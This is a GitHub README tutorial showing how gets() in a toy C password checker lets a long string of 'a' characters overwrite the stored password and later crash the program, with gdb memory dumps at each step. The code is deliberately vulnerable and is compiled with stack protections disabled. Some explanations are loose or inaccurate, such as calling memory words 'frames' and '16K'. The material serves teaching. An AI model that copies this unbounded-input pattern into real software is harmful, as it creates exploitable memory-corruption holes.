# StackOverflow

This repo was created to demonstrate the operation of a buffer overflow exploit, we are going to change a password variable within a vulnerable program which might illustrate for example how can an attacker grant access to an assumed program which requires authentication by overwriting the current/real password in the stack memory of a C program affecting **CONFIDENTIALITY AND INTEGRITY**. 

We will also impair the availability of the program generating a segmentation fault error which occurs when when a program attempts to access a memory location that it is not allowed to access, a violation in memory in most standards computers will trigger the OS kernel to perform a corrective action leading the program to be terminated, affecting the **AVAILABILITY** 

## A bit of memory 

Understanding stack-based overflow attacks involves at least a basic understanding of computer memory, let's review some very important concepts. 

### Stack memory: 

A stack is the memory which stores variables created by a function, it's temporary, when the program is finished, the memory of the variable will be automatically erased and the area freed up, the stack is managed by the CPU – so you don’t have to allocate or deallocate memory. The stack section mostly contains methods, local variable, and reference variables. 

![stack memory graph ](https://github.com/tavaresrodrigo/StackOverflow/blob/main/stack.png)
### Heap memory

The heap is the memory used by programming languages to store large block of memory, it's also known as dynamic memory. Unlike the stack this area of memory is managed by the programmer in C for example, variables are allocated and freed using functions like malloc() and free().

![stack memory vs heap memory comparison ](https://github.com/tavaresrodrigo/StackOverflow/blob/main/stackvsheap.png)


## The stack overflow exploit

When the execution stack grows beyond the memory that is reserved for it, you will cause a stack overflow as the stack will eventually consume more memory than is reserved for it and eventually overwrite other buffers in the same stack. 

### The exploit

The [code](https://github.com/tavaresrodrigo/StackOverflow/blob/main/code.c) used to illustrate the exploit has a number of security red flags.

``` C
#include <signal.h>
#include <stdio.h>
#include <string.h>
int main(){
	char realPassword[8];
	char givenPassword[8];

	strncpy(realPassword, "ffffffff", 8);
	gets(givenPassword);
	
	if (0 == strncmp(givenPassword, realPassword, 8)){
		printf("SUCCESS!\n");
	}else{
		printf("FAILURE!\n");
	}
	raise(SIGINT);
	printf("givenPassword: %s\n", givenPassword);
    printf("realPassword: %s\n", realPassword);
	return 0;
}
``` 

### gets()

The function **gets()** is used to read an arbitrary amount of data into a stack buffer without limiting the amount of data read, it just reads the data and dumps it into memory, basically this function does not matches the size of the data read with the size of the buffer, in our case **8**, which means we can pass any value to the buffer and it will be written into the stack memory.

### Compiling the code

For years attackers have been exploiting vulnerabilities in the stack memory, so it's expected that the compilers have developed mechanisms to protect the program execution against these attacks, for this this reason we will disable them in order to be able to reproduce the segmentation fault, in order to compile the program you should use the parameters below:

``` bash
# gcc -fno-stack-protector -z execstack -o code code.c
```

Do you remember the gets() ? Look at the compiler alert **"the `gets' function is dangerous and should not be used."**:

```bash
code.c: In function ‘main’:
code.c:9:2: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
    9 |  gets(givenPassword);
      |  ^~~~
      |  fgets
/usr/bin/ld: /tmp/ccipvQhp.o: in function `main':
code.c:(.text+0x2a): warning: the `gets' function is dangerous and should not be used.
```
### Running the code

As you might have noticed, the [programmer](https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/)[1] had configured a **SIGINT** in the code that allows us to use the debugger[2] to dive deep in the stack frames and confirm what is happening at the memory level, let's run the program and pass "aaaaaaaaaaaaaaaa" 16xa which will dump 4 frames in the stack as we can see below: 

```bash
(gdb) run
Starting program: /home/vagrant/StackOverflow/code
aaaaaaaaaaaaaaaa
FAILURE!
```

Now let's check the area of memory where our 16x was stored, first we need to check where exactly the stack memory is :

```bash
(gdb) info frame
Stack level 0, frame at 0x7fffffffe480:
 rip = 0x7ffff7e1618b in __GI_raise (../sysdeps/unix/sysv/linux/raise.c:50); saved rip = 0x555555555237
 called by frame at 0x7fffffffe4d0
 source language c.
 Arglist at 0x7fffffffe358, args: sig=<optimized out>
 Locals at 0x7fffffffe358, Previous frame's sp is 0x7fffffffe480
  Saved registers:
  rip at 0x7fffffffe478
```

We already know from where to start the search so let's show at least 100 frames on the screen:

```bash
(gdb) x/100x 0x7fffffffe358
[...]
0x7fffffffe468:	0x6b453000	0x0ddcad0a	0x00000000	0x00000000
0x7fffffffe478:	0x55555237	0x00005555	0x61616161	0x61616161
0x7fffffffe488:	0x61616161	0x61616161	0xf7fc0f00	0x00007fff
0x7fffffffe498:	0x55555270	0x00005555	0x66666666	0x66666666
0x7fffffffe4a8:	0x555550e0	0x00005555	0xffffe5b0	0x00007fff
[...]
```

### Overwriting the program variable in the stack

In [ASCII](https://www.rapidtables.com/code/text/ascii-table.html) [3] "a" is 61 as "f" is 66, so as we could see the 4 frames filled up with our input, and most importantly, we noticed there are only 4 frames (16K) between the area of memory which is storing the realPassword "0x66666666", what happens if we store 52xa (12+1 frames) running our program one more time ?

```bash
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/vagrant/StackOverflow/code
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
SUCCESS!
```
Voila, **SUCCESS** the realPassword was overwritten and the new password in memory now is equivalent to "realPassword, "aaaaaaaa", 8"., if we check the memory again we will confirm that the following frames were dumped with "0x61616161":

```bash
(gdb) x/100x 0x7fffffffe358
[...]
0x7fffffffe468:	0x553fd900	0x4d79bf14	0x00000000	0x00000000
0x7fffffffe478:	0x55555237	0x00005555	0x6d6d6f63	0x20646e61
0x7fffffffe488:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe498:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe4a8:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe4b8:	0x00000000	0x00000000	0x00000000	0x00000000
[...]

```

### Triggering a segmentation fault 

As we could see already, there is no limits for the gets() function, what happens if we create an input with lets say  300xa? Let's see, but first let's remove the interruption in the code, this time we will create the interruption during the code runtime by providing an input that will overwrite the stack, if you understood the stack memory correctly you will notice that memory of the variable will be automatically erased and the area freed up to the give space for the new dump, our final code must be something like that:

``` C
#include <signal.h>
#include <stdio.h>
#include <string.h>
int main(){
	char realPassword[8];
	char givenPassword[8];

	strncpy(realPassword, "ffffffff", 8);
	gets(givenPassword);
	
	if (0 == strncmp(givenPassword, realPassword, 8)){
		printf("SUCCESS!\n");
	}else{
		printf("FAILURE!\n");
	}
//	raise(SIGINT); <------ remove or comment this line
	printf("givenPassword: %s\n", givenPassword);
    printf("realPassword: %s\n", realPassword);
	return 0;
}
``` 

Let's run the command again:

``` bash
# gcc -fno-stack-protector -z execstack -o code code.c
```
``` bash
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/vagrant/StackOverflow/code
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Now have have reproduced a Segmentation fault which triggered the Kernel to send the signal [SIGSEGV](https://man7.org/linux/man-pages/man7/signal.7.html)[4] interrupting the currently-executing machine instruction in order to save the state on the stack to make it possible to continue the execution later [5]. 

```bash
(gdb) x/100x 0x7fffffffe4c0
[...]
0x7fffffffe500:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe510:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe520:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe530:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe540:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe550:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe560:	0x61616161	0x61616161	0x61616161	0x61616161
[...]
```


## References


[1]https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/    
[2]https://www.gnu.org/software/gdb/    
[3]https://www.rapidtables.com/code/text/ascii-table.html  
[4]https://man7.org/linux/man-pages/man7/signal.7.html     
[5]https://unix.stackexchange.com/questions/257598/how-does-a-segmentation-fault-work-under-the-hood
[6]https://owasp.org/www-community/vulnerabilities/Buffer_Overflow          
[7]https://www.youtube.com/watch?v=1S0aBV-Waeo          